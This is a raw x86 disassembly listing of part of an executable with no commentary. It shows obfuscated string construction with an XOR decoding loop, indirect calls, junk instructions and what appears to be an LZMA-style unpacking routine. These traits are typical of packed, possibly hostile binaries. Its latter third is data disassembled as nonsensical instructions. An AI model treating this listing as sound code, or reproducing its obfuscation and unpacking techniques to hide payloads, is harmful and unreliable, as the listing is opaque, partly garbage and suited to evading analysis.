  423f81:	lea    eax,[ebp-0x78]
  423f84:	push   eax
  423f85:	mov    eax,DWORD PTR [ebp-0x4]
  423f88:	mov    eax,DWORD PTR [eax+0x198]
  423f8e:	mov    WORD PTR [ebp-0x6e],dx
  423f92:	mov    edx,0x4f82
  423f97:	mov    WORD PTR [ebp-0x6c],dx
  423f9b:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e25
  423fa2:	mov    DWORD PTR [ebp-0x5a],0x4e24f116
  423fa9:	mov    DWORD PTR [ebp-0xe0],0x1
  423fb3:	mov    DWORD PTR [ebp-0xdc],0x255
  423fbd:	push   DWORD PTR [eax]
  423fbf:	mov    eax,DWORD PTR [ebp+0x10]
  423fc2:	call   eax
  423fc4:	mov    DWORD PTR [ebp-0x8],eax
  423fc7:	mov    eax,DWORD PTR [ebp-0x8]
  423fca:	test   eax,eax
  423fcc:	je     0x423fdf
  423fce:	xor    DWORD PTR ds:0x76586876,0x87687666
  423fd8:	jmp    0x423fdf
  423fda:	mov    edi,0x75108a4
  423fdf:	mov    eax,DWORD PTR [ebp-0x4]
  423fe2:	mov    ecx,DWORD PTR [eax+0x18c]
  423fe8:	xor    eax,eax
  423fea:	cmp    DWORD PTR [ecx],eax
  423fec:	jne    0x42425b
  423ff2:	mov    ecx,DWORD PTR [ebp-0x4]
  423ff5:	mov    ecx,DWORD PTR [ecx+0x17c]
  423ffb:	mov    DWORD PTR [ecx],eax
  423ffd:	mov    ecx,DWORD PTR [ebp-0x4]
  424000:	mov    ecx,DWORD PTR [ecx+0x180]
  424006:	mov    DWORD PTR [ecx],eax
  424008:	mov    eax,0x4e69
  42400d:	mov    WORD PTR [ebp-0x9c],ax
  424014:	mov    eax,esi
  424016:	mov    WORD PTR [ebp-0x9a],ax
  42401d:	mov    eax,0x4e79
  424022:	mov    WORD PTR [ebp-0x98],ax
  424029:	add    eax,0xffffffc0
  42402c:	mov    WORD PTR [ebp-0x96],ax
  424033:	mov    eax,0x4f8e
  424038:	mov    WORD PTR [ebp-0x94],ax
  42403f:	mov    eax,0x4e3a
  424044:	mov    WORD PTR [ebp-0x92],ax
  42404b:	add    eax,0x45
  42404e:	mov    WORD PTR [ebp-0x90],ax
  424055:	mov    eax,0x4e24
  42405a:	mov    WORD PTR [ebp-0x8e],ax
  424061:	mov    eax,esi
  424063:	mov    WORD PTR [ebp-0x8c],ax
  42406a:	mov    eax,0x4e25
  42406f:	mov    WORD PTR [ebp-0x8a],ax
  424076:	mov    eax,0x99f9
  42407b:	mov    WORD PTR [ebp-0x88],ax
  424082:	mov    eax,0x8d6a
  424087:	mov    WORD PTR [ebp-0x86],ax
  42408e:	mov    eax,0xd66f
  424093:	mov    WORD PTR [ebp-0x84],ax
  42409a:	mov    eax,0xd78b
  42409f:	mov    WORD PTR [ebp-0x82],ax
  4240a6:	mov    eax,0x27b4
  4240ab:	mov    WORD PTR [ebp-0x80],ax
  4240af:	mov    eax,0x47b4
  4240b4:	mov    WORD PTR [ebp-0x7e],ax
  4240b8:	mov    eax,0x4e3b
  4240bd:	push   0x8
  4240bf:	mov    WORD PTR [ebp-0x7c],ax
  4240c3:	mov    DWORD PTR [ebp-0x10],0x316120f
  4240ca:	mov    DWORD PTR [ebp-0xc],0x7a150a1d
  4240d1:	lea    eax,[ebp-0x10]
  4240d4:	pop    ecx
  4240d5:	mov    dl,BYTE PTR [eax]
  4240d7:	xor    dl,0x79
  4240da:	sub    dl,0x3
  4240dd:	mov    BYTE PTR [eax],dl
  4240df:	inc    eax
  4240e0:	dec    ecx
  4240e1:	jne    0x4240d5
  4240e3:	lea    eax,[ebp-0x10]
  4240e6:	mov    DWORD PTR [ebp-0xdc],eax
  4240ec:	lea    eax,[ebp-0xe0]
  4240f2:	push   eax
  4240f3:	mov    eax,DWORD PTR [ebp+0xc]
  4240f6:	xor    eax,edi
  4240f8:	add    eax,ebx
  4240fa:	push   eax
  4240fb:	mov    eax,DWORD PTR [ebp-0x4]
  4240fe:	add    eax,0x66
  424101:	push   eax
  424102:	mov    eax,DWORD PTR [ebp-0x4]
  424105:	mov    eax,DWORD PTR [eax+0x198]
  42410b:	mov    DWORD PTR [ebp-0xe0],0x1
  424115:	push   DWORD PTR [eax]
  424117:	mov    eax,DWORD PTR [ebp+0x10]
  42411a:	call   eax
  42411c:	mov    ecx,DWORD PTR [ebp+0x8]
  42411f:	xor    ecx,edi
  424121:	add    ecx,ebx
  424123:	mov    DWORD PTR [ebp-0x8],eax
  424126:	cmp    eax,ecx
  424128:	jne    0x424143
  42412a:	mov    eax,ds:0x33730bcf
  42412f:	or     eax,0x22150bce
  424134:	mov    ds:0x33730bcf,eax
  424139:	add    eax,0x3372e92e
  42413e:	mov    ds:0x33730bcf,eax
  424143:	mov    ecx,0x4f96
  424148:	mov    eax,ecx
  42414a:	mov    WORD PTR [ebp-0x40],ax
  42414e:	mov    eax,0x4e63
  424153:	mov    edx,eax
  424155:	mov    WORD PTR [ebp-0x3e],dx
  424159:	lea    edx,[ecx+0x5]
  42415c:	mov    WORD PTR [ebp-0x3c],dx
  424160:	add    edx,0xffffffe8
  424163:	mov    WORD PTR [ebp-0x3a],dx
  424167:	lea    edx,[ecx-0x9]
  42416a:	mov    WORD PTR [ebp-0x38],dx
  42416e:	add    edx,0xfffffffb
  424171:	mov    WORD PTR [ebp-0x36],dx
  424175:	lea    edx,[ecx+0x21]
  424178:	mov    WORD PTR [ebp-0x34],dx
  42417c:	mov    WORD PTR [ebp-0x32],cx
  424180:	mov    ecx,esi
  424182:	mov    WORD PTR [ebp-0x30],cx
  424186:	lea    ecx,[edx-0x1]
  424189:	mov    edx,ecx
  42418b:	mov    WORD PTR [ebp-0x54],dx
  42418f:	mov    edx,eax
  424191:	mov    WORD PTR [ebp-0x52],dx
  424195:	add    edx,0x18
  424198:	mov    WORD PTR [ebp-0x50],dx
  42419c:	mov    WORD PTR [ebp-0x4e],ax
  4241a0:	add    eax,0xa
  4241a3:	mov    WORD PTR [ebp-0x4c],ax
  4241a7:	mov    eax,0x4e68
  4241ac:	mov    WORD PTR [ebp-0x4a],ax
  4241b0:	lea    eax,[ecx-0x1f]
  4241b3:	mov    WORD PTR [ebp-0x48],ax
  4241b7:	mov    WORD PTR [ebp-0x46],cx
  4241bb:	mov    WORD PTR [ebp-0x44],si
  4241bf:	mov    eax,DWORD PTR [ebp+0x8]
  4241c2:	movzx  ecx,WORD PTR [ebp-0x54]
  4241c6:	xor    eax,edi
  4241c8:	add    eax,ebx
  4241ca:	xor    eax,ecx
  4241cc:	mov    WORD PTR [ebp-0x54],ax
  4241d0:	mov    eax,DWORD PTR [ebp+0x8]
  4241d3:	movzx  ecx,WORD PTR [ebp-0x40]
  4241d7:	xor    eax,edi
  4241d9:	add    eax,ebx
  4241db:	xor    eax,ecx
  4241dd:	mov    WORD PTR [ebp-0x40],ax
  4241e1:	xor    eax,eax
  4241e3:	mov    WORD PTR [ebp-0xf4],ax
  4241ea:	mov    WORD PTR [ebp-0x108],ax
  4241f1:	mov    edi,DWORD PTR [ebp+0x24]
  4241f4:	lea    eax,[ebp-0xf4]
  4241fa:	lea    edx,[ebp-0x54]
  4241fd:	mov    DWORD PTR [ebp-0xe0],0x2
  424207:	mov    DWORD PTR [ebp-0xdc],eax
  42420d:	call   0x426c23
  424212:	mov    DWORD PTR [ebp-0xd8],eax
  424218:	lea    eax,[ebp-0xe0]
  42421e:	push   eax
  42421f:	mov    eax,DWORD PTR [ebp+0xc]
  424222:	xor    eax,0x75108a4
  424227:	add    eax,ebx
  424229:	push   eax
  42422a:	lea    eax,[ebp-0x9c]
  424230:	push   eax
  424231:	push   DWORD PTR [ebp-0x8]
  424234:	mov    eax,DWORD PTR [ebp+0x10]
  424237:	call   eax
  424239:	mov    edi,DWORD PTR [ebp+0x24]
  42423c:	lea    eax,[ebp-0x108]
  424242:	lea    edx,[ebp-0x40]
  424245:	mov    DWORD PTR [ebp-0xdc],eax
  42424b:	call   0x426c23
  424250:	mov    DWORD PTR [ebp-0xd8],eax
  424256:	mov    edi,0x75108a4
  42425b:	mov    eax,DWORD PTR [ebp+0x14]
  42425e:	push   DWORD PTR [ebp-0x4]
  424261:	push   DWORD PTR [ebp+0x20]
  424264:	push   DWORD PTR [ebp+0x1c]
  424267:	push   DWORD PTR [ebp+0x18]
  42426a:	push   DWORD PTR [ebp+0x10]
  42426d:	push   DWORD PTR [ebp+0x8]
  424270:	push   DWORD PTR [ebp+0xc]
  424273:	call   0x4254c0
  424278:	test   eax,eax
  42427a:	je     0x4242be
  42427c:	add    DWORD PTR [ebp-0x4],eax
  42427f:	push   DWORD PTR [ebp-0x4]
  424282:	lea    esi,[ebp+0x4]
  424285:	call   0x4246ae
  42428a:	mov    eax,DWORD PTR [ebp-0x4]
  42428d:	mov    eax,DWORD PTR [eax+0x1c8]
  424293:	mov    eax,DWORD PTR [eax]
  424295:	xor    eax,edi
  424297:	add    eax,ebx
  424299:	mov    eax,DWORD PTR [ebp-0x4]
  42429c:	jne    0x4242b4
  42429e:	mov    ecx,DWORD PTR [ebp-0x4]
  4242a1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4242a7:	push   DWORD PTR [ecx]
  4242a9:	mov    eax,DWORD PTR [eax+0x1d8]
  4242af:	call   DWORD PTR [eax+0x28]
  4242b2:	jmp    0x4242be
  4242b4:	mov    eax,DWORD PTR [eax+0x17c]
  4242ba:	mov    eax,DWORD PTR [eax]
  4242bc:	add    DWORD PTR [esi],eax
  4242be:	pop    edi
  4242bf:	pop    esi
  4242c0:	pop    ebx
  4242c1:	leave  
  4242c2:	ret    0x20
  4242c5:	push   edi
  4242c6:	push   esi
  4242c7:	push   ebx
  4242c8:	push   ebp
  4242c9:	mov    ebp,esp
  4242cb:	mov    eax,DWORD PTR [ebp+0x24]
  4242ce:	add    DWORD PTR [ebp+0x28],eax
  4242d1:	push   eax
  4242d2:	cld    
  4242d3:	mov    esi,DWORD PTR [ebp+0x18]
  4242d6:	add    DWORD PTR [ebp+0x1c],esi
  4242d9:	push   esi
  4242da:	mov    esi,DWORD PTR [ebp+0x14]
  4242dd:	lods   eax,DWORD PTR ds:[esi]
  4242de:	xchg   edx,eax
  4242df:	push   edx
  4242e0:	mov    cl,BYTE PTR [esi-0x2]
  4242e3:	or     eax,0xffffffff
  4242e6:	shl    eax,cl
  4242e8:	not    eax
  4242ea:	push   eax
  4242eb:	mov    cl,dh
  4242ed:	or     eax,0xffffffff
  4242f0:	shl    eax,cl
  4242f2:	not    eax
  4242f4:	push   eax
  4242f5:	add    cl,dl
  4242f7:	mov    edi,esi
  4242f9:	sub    esp,0xc
  4242fc:	sub    eax,eax
  4242fe:	inc    eax
  4242ff:	push   eax
  424300:	push   eax
  424301:	push   eax
  424302:	push   eax
  424303:	push   eax
  424304:	push   edi
  424305:	sub    esi,esi
  424307:	push   esi
  424308:	or     ebx,0xffffffff
  42430b:	mov    eax,0x300
  424310:	shl    eax,cl
  424312:	lea    ecx,[eax+0x736]
  424318:	mov    eax,0x4000400
  42431d:	shr    ecx,1
  42431f:	rep stos DWORD PTR es:[edi],eax
  424321:	push   0x5
  424323:	pop    ecx
  424324:	call   0x42460f
  424329:	loop   0x424324
  42432b:	lea    esi,[esi]
  42432d:	lea    edi,[edi]
  42432f:	mov    edi,DWORD PTR [ebp-0x4]
  424332:	mov    eax,DWORD PTR [ebp-0x10]
  424335:	sub    edi,DWORD PTR [ebp+0x24]
  424338:	and    eax,edi
  42433a:	mov    DWORD PTR [ebp-0x18],eax
  42433d:	mov    al,0x0
  42433f:	call   0x424627
  424344:	jne    0x4243df
  42434a:	mov    cl,BYTE PTR [ebp-0xc]
  42434d:	and    edi,DWORD PTR [ebp-0x14]
  424350:	shl    edi,cl
  424352:	sub    cl,0x8
  424355:	neg    cl
  424357:	shr    esi,cl
  424359:	pop    eax
  42435a:	add    edi,esi
  42435c:	pop    esi
  42435d:	lea    edi,[edi+edi*2]
  424360:	shl    edi,0x8
  424363:	cmp    al,0x7
  424365:	pop    edx
  424366:	lea    ecx,[esi+edi*2+0xe6c]
  42436d:	push   ecx
  42436e:	push   esi
  42436f:	mov    esi,0x100
  424374:	push   eax
  424375:	mov    al,0x1
  424377:	jb     0x4243ad
  424379:	mov    edi,DWORD PTR [ebp-0x4]
  42437c:	sub    edi,DWORD PTR [ebp-0x24]
  42437f:	movzx  edi,BYTE PTR [edi]
  424382:	mov    ebp,DWORD PTR [ebp-0x34]
  424385:	shl    edi,1
  424387:	mov    ecx,esi
  424389:	and    esi,edi
  42438b:	add    ecx,esi
  42438d:	lea    ebp,[ebp+ecx*2+0x0]
  424391:	call   0x424646
  424396:	mov    ecx,eax
  424398:	shr    esi,0x8
  42439b:	and    ecx,0x1
  42439e:	cmp    esi,ecx
  4243a0:	mov    esi,0x100
  4243a5:	jne    0x4243b5
  4243a7:	cmp    eax,esi
  4243a9:	jb     0x424382
  4243ab:	jmp    0x4243c1
  4243ad:	mov    ebp,DWORD PTR [ebp-0x34]
  4243b0:	call   0x424646
  4243b5:	inc    eax
  4243b6:	inc    esi
  4243b7:	sub    eax,0x1
  4243ba:	sub    esi,0x1
  4243bd:	cmp    eax,esi
  4243bf:	jb     0x4243ad
  4243c1:	pop    edx
  4243c2:	inc    edx
  4243c3:	cmp    edx,0x5
  4243c6:	dec    edx
  4243c7:	mov    ecx,edx
  4243c9:	jb     0x4243da
  4243cb:	inc    edx
  4243cc:	cmp    edx,0xb
  4243cf:	dec    edx
  4243d0:	mov    cl,0x4
  4243d2:	dec    cl
  4243d4:	jb     0x4243da
  4243d6:	mov    cl,0x7
  4243d8:	dec    cl
  4243da:	sub    edx,ecx
  4243dc:	push   edx
  4243dd:	jmp    0x42442e
  4243df:	mov    al,0xc1
  4243e1:	dec    al
  4243e3:	call   0x424637
  4243e8:	jne    0x4243fe
  4243ea:	pop    eax
  4243eb:	pop    edi
  4243ec:	pop    edx
  4243ed:	pop    ecx
  4243ee:	pop    edx
  4243ef:	pop    ecx
  4243f0:	push   DWORD PTR [esp]
  4243f3:	push   ecx
  4243f4:	push   edx
  4243f5:	mov    edx,0x664
  4243fa:	mov    cl,0x0
  4243fc:	jmp    0x424471
  4243fe:	mov    al,0xcd
  424400:	dec    al
  424402:	call   0x424637
  424407:	jne    0x424437
  424409:	mov    al,0xf1
  42440b:	dec    al
  42440d:	call   0x424627
  424412:	jne    0x424467
  424414:	pop    eax
  424415:	cmp    al,0x7
  424417:	mov    al,0x9
  424419:	jb     0x42441d
  42441b:	mov    al,0xb
  42441d:	push   eax
  42441e:	mov    esi,DWORD PTR [ebp-0x4]
  424421:	sub    esi,DWORD PTR [ebp-0x24]
  424424:	cmp    esi,DWORD PTR [ebp+0x24]
  424427:	jb     0x4245fe
  42442d:	lods   al,BYTE PTR ds:[esi]
  42442e:	mov    edi,DWORD PTR [ebp-0x4]
  424431:	stos   BYTE PTR es:[edi],al
  424432:	jmp    0x4245c5
  424437:	mov    al,0xd8
  424439:	call   0x424637
  42443e:	mov    esi,DWORD PTR [ebp-0x28]
  424441:	je     0x42445e
  424443:	mov    al,0xe4
  424445:	call   0x424637
  42444a:	mov    esi,DWORD PTR [ebp-0x2c]
  42444d:	je     0x424458
  42444f:	mov    esi,DWORD PTR [ebp-0x30]
  424452:	mov    ecx,DWORD PTR [ebp-0x2c]
  424455:	mov    DWORD PTR [ebp-0x30],ecx
  424458:	mov    ecx,DWORD PTR [ebp-0x28]
  42445b:	mov    DWORD PTR [ebp-0x2c],ecx
  42445e:	mov    ecx,DWORD PTR [ebp-0x24]
  424461:	mov    DWORD PTR [ebp-0x28],ecx
  424464:	mov    DWORD PTR [ebp-0x24],esi
  424467:	pop    eax
  424468:	pop    edi
  424469:	pop    ecx
  42446a:	mov    edx,0xa68
  42446f:	mov    cl,0x8
  424471:	add    edx,edi
  424473:	push   edx
  424474:	push   edi
  424475:	cmp    al,0x7
  424477:	mov    al,cl
  424479:	jb     0x42447d
  42447b:	add    al,0x3
  42447d:	push   eax
  42447e:	mov    ebp,DWORD PTR [ebp-0x34]
  424481:	call   0x424644
  424486:	jne    0x42449c
  424488:	mov    eax,DWORD PTR [ebp-0x18]
  42448b:	mov    edi,DWORD PTR [ebp-0x34]
  42448e:	shl    eax,0x3
  424491:	sub    ecx,ecx
  424493:	push   0x8
  424495:	pop    esi
  424496:	lea    edi,[edi+eax*2+0x4]
  42449a:	jmp    0x4244d1
  42449c:	mov    ebp,DWORD PTR [ebp-0x34]
  42449f:	add    ebp,0x2
  4244a2:	call   0x424644
  4244a7:	jne    0x4244c1
  4244a9:	mov    eax,DWORD PTR [ebp-0x18]
  4244ac:	mov    edi,DWORD PTR [ebp-0x34]
  4244af:	shl    eax,0x3
  4244b2:	push   0x8
  4244b4:	pop    ecx
  4244b5:	push   0x8
  4244b7:	pop    esi
  4244b8:	lea    edi,[edi+eax*2+0x104]
  4244bf:	jmp    0x4244d1
  4244c1:	mov    edi,0x204
  4244c6:	add    edi,DWORD PTR [ebp-0x34]
  4244c9:	push   0x10
  4244cb:	pop    ecx
  4244cc:	mov    esi,0x100
  4244d1:	mov    DWORD PTR [ebp-0x1c],ecx
  4244d4:	sub    eax,eax
  4244d6:	inc    eax
  4244d7:	mov    ebp,edi
  4244d9:	call   0x424646
  4244de:	mov    ecx,eax
  4244e0:	sub    ecx,esi
  4244e2:	jb     0x4244d7
  4244e4:	add    DWORD PTR [ebp-0x1c],ecx
  4244e7:	cmp    DWORD PTR [ebp-0x3c],0x4
  4244eb:	jae    0x4245a1
  4244f1:	add    DWORD PTR [ebp-0x3c],0x7
  4244f5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4244f8:	cmp    ecx,0x4
  4244fb:	jb     0x424500
  4244fd:	push   0x3
  4244ff:	pop    ecx
  424500:	mov    edi,DWORD PTR [ebp-0x38]
  424503:	shl    ecx,0x6
  424506:	sub    eax,eax
  424508:	inc    eax
  424509:	push   0x40
  42450b:	pop    esi
  42450c:	lea    edi,[edi+ecx*2+0x360]
  424513:	mov    ebp,edi
  424515:	call   0x424646
  42451a:	mov    ecx,eax
  42451c:	sub    ecx,esi
  42451e:	jb     0x424513
  424520:	mov    DWORD PTR [ebp-0x18],ecx
  424523:	mov    DWORD PTR [ebp-0x24],ecx
  424526:	cmp    ecx,0x4
  424529:	jb     0x42459e
  42452b:	mov    esi,ecx
  42452d:	and    DWORD PTR [ebp-0x24],0x1
  424531:	shr    esi,1
  424533:	or     DWORD PTR [ebp-0x24],0x2
  424537:	dec    esi
  424538:	cmp    ecx,0xe
  42453b:	jae    0x424556
  42453d:	mov    eax,0x2af
  424542:	sub    eax,ecx
  424544:	mov    ecx,esi
  424546:	shl    BYTE PTR [ebp-0x24],cl
  424549:	add    eax,DWORD PTR [ebp-0x24]
  42454c:	shl    eax,1
  42454e:	add    eax,DWORD PTR [ebp-0x38]
  424551:	mov    DWORD PTR [ebp-0x34],eax
  424554:	jmp    0x424583
  424556:	sub    esi,0x4
  424559:	call   0x424603
  42455e:	shr    ebx,1
  424560:	shl    DWORD PTR [ebp-0x24],1
  424563:	cmp    DWORD PTR [ebp-0x20],ebx
  424566:	jb     0x42456e
  424568:	inc    DWORD PTR [ebp-0x24]
  42456b:	sub    DWORD PTR [ebp-0x20],ebx
  42456e:	dec    esi
  42456f:	jne    0x424559
  424571:	mov    eax,0x644
  424576:	add    eax,DWORD PTR [ebp-0x38]
  424579:	mov    DWORD PTR [ebp-0x34],eax
  42457c:	shl    DWORD PTR [ebp-0x24],0x4
  424580:	push   0x4
  424582:	pop    esi
  424583:	sub    edi,edi
  424585:	inc    edi
  424586:	mov    eax,edi
  424588:	mov    ebp,DWORD PTR [ebp-0x34]
  42458b:	call   0x424646
  424590:	test   al,0x1
  424592:	je     0x424597
  424594:	or     DWORD PTR [ebp-0x24],edi
  424597:	shl    edi,1
  424599:	dec    esi
  42459a:	jne    0x424588
  42459c:	jmp    0x42459e
  42459e:	inc    DWORD PTR [ebp-0x24]
  4245a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4245a4:	add    ecx,0x2
  4245a7:	mov    edi,DWORD PTR [ebp-0x4]
  4245aa:	mov    eax,edi
  4245ac:	sub    eax,DWORD PTR [ebp+0x24]
  4245af:	cmp    DWORD PTR [ebp-0x24],eax
  4245b2:	ja     0x4245fe
  4245b4:	mov    esi,edi
  4245b6:	sub    esi,DWORD PTR [ebp-0x24]
  4245b9:	mov    edx,DWORD PTR [ebp+0x28]
  4245bc:	lods   al,BYTE PTR ds:[esi]
  4245bd:	stos   BYTE PTR es:[edi],al
  4245be:	cmp    edi,edx
  4245c0:	jae    0x4245c5
  4245c2:	dec    ecx
  4245c3:	jne    0x4245bc
  4245c5:	mov    DWORD PTR [ebp-0x4],edi
  4245c8:	movzx  esi,al
  4245cb:	cmp    edi,DWORD PTR [ebp+0x28]
  4245ce:	jb     0x42432f
  4245d4:	call   0x424603
  4245d9:	sub    eax,eax
  4245db:	lea    ebp,[esp+0x3c]
  4245df:	mov    edx,DWORD PTR [ebp+0x20]
  4245e2:	mov    esi,DWORD PTR [ebp-0x8]
  4245e5:	sub    esi,DWORD PTR [ebp+0x18]
  4245e8:	mov    DWORD PTR [edx],esi
  4245ea:	mov    edx,DWORD PTR [ebp+0x2c]
  4245ed:	mov    edi,DWORD PTR [ebp-0x4]
  4245f0:	sub    edi,DWORD PTR [ebp+0x24]
  4245f3:	mov    DWORD PTR [edx],edi
  4245f5:	leave  
  4245f6:	pop    ebx
  4245f7:	pop    esi
  4245f8:	pop    edi
  4245f9:	ret    0x1c
  4245fc:	pop    esi
  4245fd:	pop    eax
  4245fe:	sub    eax,eax
  424600:	inc    eax
  424601:	jmp    0x4245db
  424603:	cmp    ebx,0x1000000
  424609:	jb     0x42460c
  42460b:	ret    
  42460c:	shl    ebx,0x8
  42460f:	push   esi
  424610:	mov    esi,DWORD PTR [ebp-0x8]
  424613:	cmp    esi,DWORD PTR [ebp+0x1c]
  424616:	jae    0x4245fc
  424618:	mov    eax,DWORD PTR [ebp-0x20]
  42461b:	shl    eax,0x8
  42461e:	lods   al,BYTE PTR ds:[esi]
  42461f:	mov    DWORD PTR [ebp-0x20],eax
  424622:	mov    DWORD PTR [ebp-0x8],esi
  424625:	sbb    BYTE PTR [edi+0x6bbe29f7],bh
  42462b:	sar    BYTE PTR [edx+0x7f7e9dbd],0x31
  424632:	xchg   edx,eax
  424633:	jg     0x4245f2
  424635:	xchg   edi,eax
  424636:	jo     0x4246a3
  424638:	sar    BYTE PTR [edx-0x841ce81],0x9
  42463f:	mov    dl,0xe9
  424641:	push   ss
  424642:	xor    DWORD PTR [edx+0x57],edi
  424645:	mov    edx,0x7a3116e9
  42464a:	std    
  42464b:	xchg   DWORD PTR [edx+0x7a],edi
  42464e:	jp     0x4246cd
  424650:	pcmpgtd mm6,mm7
  424653:	ss pop esi
  424655:	inc    edx
  424656:	mov    ebp,0x725a5e1e
  42465b:	inc    edi
  42465c:	ss pop esi
  42465e:	es (bad) 
  424661:	hlt    
  424662:	ins    DWORD PTR es:[edi],dx
  424663:	jnp    0x4246a3
  424665:	pop    esi
  424666:	inc    edx
  424667:	mov    ebp,0x2ef2729f
  42466c:	pop    esi
  42466d:	pop    edx
  42466e:	div    DWORD PTR [edi+0x7a21c36b]
  424674:	mov    ebp,0xcb6b7795
  424679:	mov    ah,0x45
  42467b:	ss pop esi
  42467d:	pop    edx
  42467e:	packsswb mm6,mm7
  424681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	lds    edi,FWORD PTR [edx+0x72]
  424685:	jp     0x424701
  424687:	push   edi
  424688:	mov    ah,0xbd
  42468a:	xchg   ebp,eax
  42468b:	jno    0x42469d
  42468d:	jge    0x4246b8
  42468f:	jp     0x424710
  424691:	mov    edx,0x3a5e16e9
  424696:	mov    edi,0x557194bd
  42469b:	ss pop esi
  42469d:	pop    edx
  42469e:	push   edi
  42469f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a0:	adc    BYTE PTR [ebp+0x21],dl
  4246a3:	jp     0x424724
  4246a5:	mov    edx,0xe97dbaff
  4246aa:	push   ss
  4246ab:	pop    esi
  4246ac:	cmp    bh,BYTE PTR [edi-0x26908df]
  4246b2:	xchg   esi,eax
  4246b3:	push   esi
  4246b4:	jge    0x424730
  4246b6:	jp     0x4246e7
  4246b8:	and    BYTE PTR [ebx],ah
  4246ba:	mov    bl,0x31
  4246bc:	mov    cl,dl
  4246be:	icebp  
  4246bf:	out    0x82,al
  4246c1:	mov    bl,0x31
  4246c3:	xchg   edx,eax
  4246c4:	int    0xf1
  4246c6:	out    0x82,al
  4246c8:	div    DWORD PTR [ecx]
  4246ca:	jb     0x4246c1
  4246cc:	xor    DWORD PTR [edx-0x9],esi
  4246cf:	sub    DWORD PTR [edx+0x2d72dec7],ecx
  4246d5:	jae    0x424726
  4246d7:	mov    bh,0xc2
  4246d9:	xchg   esi,eax
  4246da:	or     al,0x4c
  4246dc:	jp     0x42475d
  4246de:	mov    dl,0xf5
  4246e0:	sub    DWORD PTR [esi+0x4f8a29f7],ebp
  4246e6:	mov    bh,0x7f
  4246e8:	mov    dl,0xf5
  4246ea:	sub    DWORD PTR [esi+0x4f8a29f7],edi
  4246f0:	mov    bh,0x7f
  4246f2:	mov    dl,0xf5
  4246f4:	sub    DWORD PTR [edx+0x4f8a29f7],edi
  4246fa:	mov    bh,0x7f
  4246fc:	mov    dl,0xf5
  4246fe:	jmp    0x7bbdc255
  424703:	mov    bl,0x31
  424705:	retf   0x71ca
  424708:	fild   DWORD PTR [edx-0x3545ce4d]
  42470e:	shl    esi,0x82
  424711:	mov    bl,0x31
  424713:	(bad)  
  424714:	(bad)  
  424715:	icebp  
  424716:	out    0x82,al
  424718:	adc    al,0x51
  42471a:	and    eax,0xf5b229f5
  42471f:	sub    DWORD PTR [edx-0xadaeeec],esi
  424725:	sub    DWORD PTR [edx-0x4c4dd60b],esi
  42472b:	xor    DWORD PTR [edx+0x7a7a7a29],esi
  424731:	mov    bl,0x31
  424733:	mov    dl,0x3f
  424735:	jp     0x4247b1
  424737:	jp     0x424730
  424739:	sub    DWORD PTR [edx-0x4d8048b1],ecx
  42473f:	cmc    
  424740:	sub    DWORD PTR [edx+0x4f8a29f7],esi
  424746:	mov    bh,0x7f
  424748:	mov    dl,0xf5
  42474a:	sub    DWORD PTR [edx+0x22a231b3],esi
  424750:	jl     0x4247cc
  424752:	jp     0x424707
  424754:	xor    DWORD PTR [edx+0x7a7a7a40],ebx
  42475a:	mov    bl,0x31
  42475c:	xchg   esi,eax
  42475d:	add    al,0x7a
  42475f:	jp     0x4247db
  424761:	jmp    0x7bbad61f
  424766:	jnp    0x424751
  424768:	shr    DWORD PTR [esi-0x6d848488],0xb9
  42476f:	jbe    0x4247eb
  424771:	jp     0x4247ee
  424773:	sub    DWORD PTR [esi+0x297b9401],edx
  424779:	call   0x1a2:0x297b9801
  424780:	lods   al,BYTE PTR ds:[esi]
  424781:	mov    bl,0x31
  424783:	mov    ds:0x7a7a3a68,al
  424788:	div    DWORD PTR [ecx]
  42478a:	mov    cl,BYTE PTR [edi-0x41]
  42478d:	mov    eax,0x7a4c0c96
  424792:	jg     0x424744
  424794:	cmc    
  424795:	xor    DWORD PTR [esi-0x75ce09],ebx
  42479b:	rcl    DWORD PTR [esi],1
  42479d:	jnp    0x42481a
  42479f:	jnp    0x42481b
  4247a1:	dec    edi
  4247a2:	mov    edi,0x31f5b07f
  4247a7:	mov    dh,0x1e
  4247a9:	frstor [edx+0x7a]
  4247ac:	jp     0x424828
  4247ae:	cmc    
  4247af:	icebp  
  4247b0:	push   ss
  4247b1:	jnp    0x42482e
  4247b3:	jnp    0x4247ac
  4247b5:	cmp    cl,BYTE PTR [edx-0xb]
  4247b8:	icebp  
  4247b9:	dec    esi
  4247ba:	jnp    0x424837
  4247bc:	jnp    0x4247b5
  4247be:	cmp    dh,BYTE PTR [esi-0xb]
  4247c1:	icebp  
  4247c2:	cmp    bh,BYTE PTR [ebx+0x7b]
  4247c5:	jnp    0x4247be
  4247c7:	xor    DWORD PTR [edx-0x17],esi
  4247ca:	jmp    0x7bbdc2e5
  4247cf:	cmc    
  4247d0:	repnz fidivr DWORD PTR [ebp+0x7a]
  4247d4:	jp     0x4247cd
  4247d6:	xor    DWORD PTR [edx-0x17],esi
  4247d9:	jmp    0x7bbdc32c
  4247de:	cmc    
  4247df:	repnz fidivr WORD PTR [ebp+0x7a]
  4247e3:	jp     0x4247dc
  4247e5:	xor    DWORD PTR [edx+0x7b],esi
  4247e8:	add    DWORD PTR [edx-0x17],esi
  4247eb:	jmp    0x7bbdc32a
  4247f0:	cmc    
  4247f1:	repnz sar BYTE PTR [ebp+0x7a],cl
  4247f5:	jp     0x424789
  4247f7:	test   DWORD PTR [edi+0x7a],ebx
  4247fa:	jp     0x4247f3
  4247fc:	sub    DWORD PTR [edx-0x578048b1],ecx
  424802:	inc    edi
  424803:	mov    dl,0x6b
  424805:	(bad)  
  424806:	stc    
  424807:	jg     0x424883
  424809:	jp     0x424802
  42480b:	xor    DWORD PTR [edx-0x9],esi
  42480e:	cli    
  42480f:	out    dx,al
  424810:	jge    0x42488c
  424812:	jp     0x42480b
  424814:	jb     0x42480d
  424816:	xor    DWORD PTR [edx-0x9],esi
  424819:	cli    
  42481a:	out    dx,al
  42481b:	jge    0x424897
  42481d:	jp     0x424816
  42481f:	jp     0x4248a0
  424821:	cmp    eax,0x829f746
  424826:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42482c:	lea    edx,[ebp-0xec]
  424832:	push   edx
  424833:	mov    edx,DWORD PTR [ebp+0x8]
  424836:	mov    edx,DWORD PTR [edx+0x18c]
